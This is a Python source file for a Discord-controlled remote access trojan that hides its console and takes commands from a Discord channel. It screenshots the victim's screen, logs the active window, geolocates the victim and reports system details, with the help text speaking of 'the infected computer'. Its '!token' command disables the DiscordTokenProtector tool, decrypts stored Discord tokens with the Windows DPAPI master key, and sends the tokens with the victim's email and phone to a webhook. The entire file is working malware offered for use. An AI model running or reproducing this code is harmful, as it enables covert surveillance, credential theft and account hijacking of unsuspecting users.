import ctypes
import os
import uuid
import json
import platform
import urllib.request
import discord
from discord.ext import commands
import asyncio
from discord import utils
from requests import get
from mss import mss
from Crypto.Cipher import AES
import base64
import re
import requests
from win32crypt import CryptUnprotectData

def hide_console():
    if os.name == 'nt':
        ctypes.windll.kernel32.FreeConsole()

# Hide the console window
hide_console()

# Set intents
intents = discord.Intents.default()
intents.message_content = True  # Enable this if you need to access message content

# Correct Client initialization with the intents parameter
client = discord.Client(intents=intents)

# Create a Bot instance with the intents parameter
bot = commands.Bot(command_prefix='!', intents=intents)

# Bot token
token = 'YOUR_TOKEN_HERE'  # Replace with your bot's actual token

global uuidgen
uuidgen = str(uuid.uuid4())

helpmenu = """
--> **!window = Get the currently active window on the infected computer**
--> **!admincheck = Check if the program has admin privileges**
--> **!sysinfo = Provides information about the infected computer**
--> **!wallpaper = Change the infected computer's wallpaper**
--> **!geolocate = Geolocate the computer using the IP address**
--> **!screenshot = Get a screenshot of the user's current screen**
--> **!token = Get Discord token**
--> **!exit = Exit the program/kill session**
"""

@client.event
async def on_ready():
    global uuidgen
    uuidgen = str(uuid.uuid4())
    
    # Get IP and location information
    try:
        with urllib.request.urlopen("https://geolocation-db.com/json") as url:
            data = json.loads(url.read().decode())
            flag = data['country_code']
            ip = data['IPv4']
    except Exception as e:
        print(f"Failed to retrieve IP and location info: {e}")
        flag = "unknown"
        ip = "unknown"

    game = discord.Game(f"Controlling: {platform.system()} {platform.release()}")
    await client.change_presence(status=discord.Status.online, activity=game)
    
    # Create a new text channel in the first guild
    guild = client.guilds[0]
    newchannel = await guild.create_text_channel(uuidgen)
    channel = discord.utils.get(guild.text_channels, name=uuidgen)
    
    # Check for admin privileges
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    message = f"@here  New session opened  @here"
    
    if is_admin:
        await channel.send(f'{message} | :gem:')
    else:
        await channel.send(message)

@client.event
async def on_message(message):
    if message.channel.name != uuidgen:
        return

    if message.content == "!window":
        import win32gui
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        await message.channel.send(f"[ ~ ] User's current active window is: {window}")

    elif message.content == "!screenshot":
        path = os.path.join(os.getenv('TEMP'), "monitor.png")
        with mss() as sct:
            sct.shot(output=path)
        file = discord.File(path, filename="monitor.png")
        await message.channel.send("[ ~ ] Command successfully executed", file=file)
        os.remove(path)

    elif message.content.startswith("!wallpaper"):
        path = os.path.join(os.getenv('TEMP'), "temp.jpg")
        await message.attachments[0].save(path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
        await message.channel.send("[ ~ ] Command successfully executed")

    elif message.content == "!sysinfo":
        system_info = str(platform.uname())
        intro = system_info[12:]
        ip = get('https://api.ipify.org').text
        ip_info = "IP Address = " + ip
        await message.channel.send("[ ~ ] Command successfully executed: " + intro + ip_info)

    elif message.content == "!help":
        embed = discord.Embed(title="Help Command List", color=0x000000)  # Black color
        embed.add_field(name="Available Commands are:", value=helpmenu, inline=False)
        embed.set_footer(text="Discord Remote Access | Created by Danslvck")
        await message.channel.send(embed=embed)

    elif message.content == "!exit":
        import sys
        sys.exit()

    elif message.content == "!geolocate":
        try:
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                await message.channel.send("[ ~ ] Command successfully executed: " + link)
        except Exception as e:
            await message.channel.send(f"Failed to retrieve geolocation info: {e}")

    elif message.content == "!admincheck":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            await message.channel.send("[ ~ ] Congrats, you're an admin")
        else:
            await message.channel.send("[ ~ ] Sorry, you're not an admin")

    elif message.content == "!token":
        if message.author.guild_permissions.administrator:
            try:
                channel = message.channel
                webhook = await channel.create_webhook(name="Token Collector")
                webhook_url = webhook.url

                # Executes the token collection and sending logic using the created webhook
                Discord(webhook_url)
            except Exception as e:
                await message.channel.send(f"Failed to create webhook: {e}")
        else:
            await message.channel.send("[ ~ ] You do not have permission to use this command.")

class Discord:
    def __init__(self, webhook):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []
        self.webhook = webhook

        self.killprotector()
        self.grabTokens()
        self.upload(self.webhook)

    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = os.path.join(path, "config.json")

        if not os.path.exists(path):
            return

        for process in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(os.path.join(path, process))
            except FileNotFoundError:
                pass

        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item.update({
                    'auto_start': False,
                    'auto_start_discord': False,
                    'integrity': False,
                    'integrity_allowbetterdiscord': False,
                    'integrity_checkexecutable': False,
                    'integrity_checkhash': False,
                    'integrity_checkmodule': False,
                    'integrity_checkscripts': False,
                    'integrity_checkresource': False,
                    'integrity_redownloadhashes': False,
                    'iterations_iv': 364,
                    'iterations_key': 457,
                    'version': 69420
                })

            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            print(f"Failed to decrypt password: {e}")
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': os.path.join(self.roaming, 'discord', 'Local Storage', 'leveldb'),
            # Add other paths here as needed
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue

            disc = name.replace(" ", "").lower()
            local_state_path = os.path.join(self.roaming, f'{disc}', 'Local State')
            
            if "cord" in path and os.path.exists(local_state_path):
                try:
                    master_key = self.get_master_key(local_state_path)
                except Exception as e:
                    print(f"Failed to get master key for {name}: {e}")
                    continue

                for file_name in os.listdir(path):
                    if not file_name.endswith((".log", ".ldb")):
                        continue
                    with open(os.path.join(path, file_name), errors='ignore') as f:
                        lines = f.readlines()
                    for line in lines:
                        line = line.strip()
                        for y in re.findall(self.encrypted_regex, line):
                            try:
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), master_key)
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token
                                })
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
                            except Exception as e:
                                print(f"Failed to process token: {e}")

            else:
                for file_name in os.listdir(path):
                    if not file_name.endswith((".log", ".ldb")):
                        continue
                    with open(os.path.join(path, file_name), errors='ignore') as f:
                        lines = f.readlines()
                    for line in lines:
                        line = line.strip()
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token
                                })
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
                            except Exception as e:
                                print(f"Failed to process token: {e}")

    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue

            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                    'Content-Type': 'application/json',
                    'Authorization': token
                }
                user = requests.get(self.baseurl, headers=headers).json()
                
                username = user.get('username', 'N/A')
                discord_id = user.get('id', 'N/A')
                avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user.get('avatar', 'default')}.png"
                phone = user.get('phone', 'N/A')
                email = user.get('email', 'N/A')

                val = (f'**Discord ID:** `{discord_id}`\n'
                       f'**Email:** `{email}`\n'
                       f'**Phone:** `{phone}`\n\n'
                       f'**Token:** `{token}`\n')

                data = {
                    "embeds": [
                        {
                            "title": f"{username}",
                            "color": 0x000000,  # Black color
                            "fields": [
                                {
                                    "name": "Discord Info",
                                    "value": val
                                }
                            ],
                            "thumbnail": {
                                "url": avatar_url
                            },
                            "footer": {
                                "text": "Discord Remote Access | Created by Danslvck"
                            },
                        }
                    ],
                    "username": "Danslvck",
                    "avatar_url": "https://cdn.discordapp.com/avatars/1278171136747634778/933a5306e4bb389ee6d974d9b97055b1.png?size=2048",
                }

                response = requests.post(webhook, json=data)
                if response.status_code == 204:
                    print(f"Token successfully sent: {token}")
                else:
                    print(f"Failed to send token: {response.status_code} - {response.text}")

                self.tokens_sent.append(token)
            except Exception as e:
                print(f"Error sending token: {e}")

client.run(token)
